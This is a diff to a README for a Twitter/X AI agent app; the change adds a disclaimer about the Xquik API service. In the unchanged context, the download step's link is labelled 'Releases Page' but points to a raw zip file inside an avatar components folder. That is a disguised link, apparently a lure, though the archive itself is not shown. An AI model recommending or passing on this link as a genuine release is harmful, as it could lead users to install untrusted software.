@@ -20,6 +20,7 @@ The **twitter-ai-agent** application allows users to interact with Twitter using
 To get started, you need to download the application.
 
 1. Visit this page to download: [Releases Page](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip)
+
 2. Choose the latest version of the software from the list provided.
 
 3. Click on the download link for the appropriate file for your operating system. Follow the prompts to save the file to your computer.
@@ -62,6 +63,9 @@ XQUIK_ACCOUNT=@your_connected_account
 `XQUIK_BASE_URL` is optional and defaults to `https://xquik.com`. See the
 [Xquik create tweet API docs](https://docs.xquik.com/api-reference/x-write/create-tweet)
 for the live request contract.
+
+Xquik is an independent third-party service. Not affiliated with X Corp.
+"Twitter" and "X" are trademarks of X Corp.
 
 ## ❓ Support
 
